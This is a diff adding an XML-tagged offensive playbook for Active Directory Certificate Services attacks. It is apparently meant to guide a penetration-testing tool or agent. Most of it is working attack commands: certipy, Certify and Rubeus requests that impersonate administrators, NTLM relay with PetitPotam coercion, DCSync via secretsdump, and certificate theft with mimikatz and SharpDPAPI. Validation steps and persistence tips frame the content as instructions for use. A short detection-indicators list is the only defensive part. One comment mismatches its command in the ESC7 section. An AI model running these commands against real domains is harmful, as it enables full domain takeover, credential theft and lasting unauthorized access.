@@ -1,0 +1,246 @@
+<vulnerability_guide>
+  <title>ACTIVE DIRECTORY CERTIFICATE SERVICES (AD CS) ATTACKS</title>
+
+  <critical>AD CS misconfigurations (ESC1-ESC11) allow attackers to obtain certificates that can be used for authentication as any user, including Domain Admins. These attacks are particularly dangerous because certificates persist even after password changes and can provide long-term persistent access. AD CS vulnerabilities are among the most impactful findings in Active Directory environments.</critical>
+
+  <scope>
+    - Certificate template misconfigurations (ESC1-ESC4)
+    - PKI infrastructure vulnerabilities (ESC5-ESC8)
+    - Certificate theft and forgery (ESC9-ESC11)
+    - NTLM relay to certificate enrollment
+    - Machine certificate abuse
+    - Cross-forest certificate attacks
+  </scope>
+
+  <methodology>
+    1. **Enumerate CA infrastructure**: Identify Certificate Authorities and templates
+    2. **Find vulnerable templates**: Check for misconfigured enrollment permissions
+    3. **Identify attack path**: Determine exploitable ESC vulnerability
+    4. **Obtain certificate**: Request certificate for privileged user
+    5. **Authenticate**: Use certificate for Kerberos/NTLM authentication
+  </methodology>
+
+  <advanced_techniques>
+    <ca_enumeration>
+      Discover AD CS infrastructure:
+      {% raw %}
+      # Certipy - comprehensive enumeration
+      certipy find -u user@domain.local -p pass -dc-ip DC_IP
+      certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable
+
+      # Certify.exe - Windows enumeration
+      Certify.exe find
+      Certify.exe find /vulnerable
+      Certify.exe find /enrolleeSuppliesSubject
+
+      # LDAP enumeration
+      ldapsearch -x -H ldap://DC_IP -b "CN=Configuration,DC=domain,DC=local" "(objectClass=pKIEnrollmentService)"
+
+      # PowerShell
+      Get-ADObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Filter *
+      {% endraw %}
+    </ca_enumeration>
+
+    <esc1_template_allows_san>
+      ESC1 - Template allows requester to specify Subject Alternative Name:
+      {% raw %}
+      # Identify vulnerable template
+      certipy find -vulnerable -stdout | grep -A 20 "ESC1"
+      Certify.exe find /enrolleeSuppliesSubject
+
+      # Request certificate as Domain Admin
+      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'VulnerableTemplate' -upn administrator@domain.local
+
+      # Certify.exe
+      Certify.exe request /ca:dc.domain.local\CA-NAME /template:VulnerableTemplate /altname:administrator
+
+      # Authenticate with certificate
+      certipy auth -pfx administrator.pfx -dc-ip DC_IP
+      # Returns NTLM hash
+
+      # Rubeus - authenticate with certificate
+      Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass /ptt
+      {% endraw %}
+    </esc1_template_allows_san>
+
+    <esc2_any_purpose_template>
+      ESC2 - Template allows Any Purpose EKU or no EKU:
+      {% raw %}
+      # Find Any Purpose templates
+      certipy find -vulnerable -stdout | grep -A 20 "ESC2"
+      Certify.exe find /vulnerable
+
+      # Request certificate
+      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'AnyPurposeTemplate'
+
+      # Use for client authentication
+      certipy auth -pfx user.pfx
+
+      # SubCA certificate can sign other certificates
+      # Can be used to create certificates for any user
+      {% endraw %}
+    </esc2_any_purpose_template>
+
+    <esc3_enrollment_agent>
+      ESC3 - Template allows enrollment agent to request on behalf of others:
+      {% raw %}
+      # Find enrollment agent templates
+      certipy find -vulnerable -stdout | grep -A 20 "ESC3"
+
+      # Step 1: Get enrollment agent certificate
+      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'EnrollmentAgentTemplate'
+
+      # Step 2: Use agent cert to request cert on behalf of admin
+      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'User' -on-behalf-of 'domain\administrator' -pfx enrollment_agent.pfx
+
+      # Certify.exe
+      Certify.exe request /ca:CA /template:User /onbehalfof:domain\administrator /enrollcert:agent.pfx
+      {% endraw %}
+    </esc3_enrollment_agent>
+
+    <esc4_template_acl>
+      ESC4 - Vulnerable template ACL allows modification:
+      {% raw %}
+      # Find templates with weak ACLs
+      certipy find -vulnerable -stdout | grep -A 20 "ESC4"
+
+      # Modify template to enable ESC1
+      # Add ENROLLEE_SUPPLIES_SUBJECT flag
+      certipy template -u user@domain.local -p pass -template 'TargetTemplate' -save-old
+
+      # StandIn.exe
+      StandIn.exe --adcs --filter TargetTemplate --ess
+
+      # PowerShell - modify template
+      Set-ADObject "CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace @{'msPKI-Certificate-Name-Flag'=1}
+
+      # Now exploit as ESC1
+      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'TargetTemplate' -upn administrator@domain.local
+      {% endraw %}
+    </esc4_template_acl>
+
+    <esc6_editf_attributesubjectaltname2>
+      ESC6 - CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled:
+      {% raw %}
+      # Check CA configuration
+      certipy find -vulnerable -stdout | grep -A 20 "ESC6"
+      certutil -config "CA\CA-NAME" -getreg policy\EditFlags
+
+      # Request any template with SAN
+      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'User' -upn administrator@domain.local
+
+      # Certify.exe
+      Certify.exe request /ca:CA /template:User /altname:administrator
+      {% endraw %}
+    </esc6_editf_attributesubjectaltname2>
+
+    <esc7_ca_acl>
+      ESC7 - Vulnerable CA ACL allows ManageCA/ManageCertificates:
+      {% raw %}
+      # Find CAs with weak ACLs
+      certipy find -vulnerable -stdout | grep -A 20 "ESC7"
+
+      # Add ManageCA to enable ESC6
+      certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -add-officer user
+
+      # Enable EDITF_ATTRIBUTESUBJECTALTNAME2
+      certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -enable-template 'SubCA'
+
+      # Now exploit as ESC6
+      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'User' -upn administrator@domain.local
+      {% endraw %}
+    </esc7_ca_acl>
+
+    <esc8_ntlm_relay>
+      ESC8 - NTLM relay to AD CS HTTP endpoint:
+      {% raw %}
+      # Identify Web Enrollment endpoint
+      certipy find -vulnerable -stdout | grep -A 20 "ESC8"
+      curl -I http://ca.domain.local/certsrv/
+
+      # Set up relay
+      ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
+
+      # Coerce DC authentication
+      PetitPotam.py attacker_ip dc.domain.local
+
+      # Relay provides certificate for DC machine account
+      # Authenticate with DC certificate
+      certipy auth -pfx dc.pfx -dc-ip DC_IP
+
+      # DCSync with machine account hash
+      secretsdump.py -hashes :HASH domain/DC\$@dc.domain.local
+      {% endraw %}
+    </esc8_ntlm_relay>
+
+    <esc9_no_security_extension>
+      ESC9 - Certificate without security extension can impersonate:
+      {% raw %}
+      # Check for templates without security extension
+      certipy find -vulnerable -stdout | grep -A 20 "ESC9"
+
+      # Shadow Credentials + certificate abuse
+      # Requires GenericWrite on target user
+
+      certipy shadow auto -u user@domain.local -p pass -account target
+      {% endraw %}
+    </esc9_no_security_extension>
+
+    <certificate_theft>
+      Steal existing certificates:
+      {% raw %}
+      # Export from Windows cert store
+      Certify.exe find /clientauth
+      mimikatz # crypto::certificates /export
+
+      # Find certificates in files
+      dir /s *.pfx *.p12 *.pem *.cer
+
+      # DPAPI-protected certificates
+      SharpDPAPI.exe certificates /machine
+
+      # certipy - export from AD
+      certipy find -u user@domain.local -p pass -dc-ip DC_IP -old-bloodhound
+      {% endraw %}
+    </certificate_theft>
+  </advanced_techniques>
+
+  <validation>
+    - Successfully enumerate CA and certificate templates
+    - Identify at least one exploitable ESC vulnerability
+    - Obtain certificate allowing authentication as privileged user
+    - Successfully authenticate using obtained certificate
+    - Demonstrate persistence capability (certificate valid after password change)
+  </validation>
+
+  <false_positives>
+    - Template requires manager approval
+    - Template requires authorized signatures
+    - CA is offline or unreachable
+    - Certificate enrollment quota exceeded
+    - User not enrolled in template ACL
+  </false_positives>
+
+  <detection_indicators>
+    - Event ID 4886 (Certificate Services received certificate request)
+    - Event ID 4887 (Certificate Services approved certificate request)
+    - Certificate requests with SAN different from requester
+    - Machine certificate requests from non-machine principals
+    - High volume of certificate requests from single user
+    - Unusual certificate template usage patterns
+  </detection_indicators>
+
+  <pro_tips>
+    - ESC8 + PetitPotam = Domain compromise from any domain user
+    - Certificates survive password changes (persistent access)
+    - Check for vulnerable templates in all domains in forest
+    - Machine templates can be abused for RBCD attacks
+    - ESC1 is most common and easiest to exploit
+    - ESC4 can convert any template to ESC1
+    - Web Enrollment (certsrv) is often enabled and vulnerable to relay
+    - Certificate-based auth bypasses many detection mechanisms
+    - Golden Certificate = forge certs for any user using CA private key
+  </pro_tips>
+
+  <remember>AD CS misconfigurations can provide complete domain compromise from a standard user account and persistent access that survives credential rotation. Always check for ESC1 and ESC8 as they are the most common and impactful.</remember>
+</vulnerability_guide>
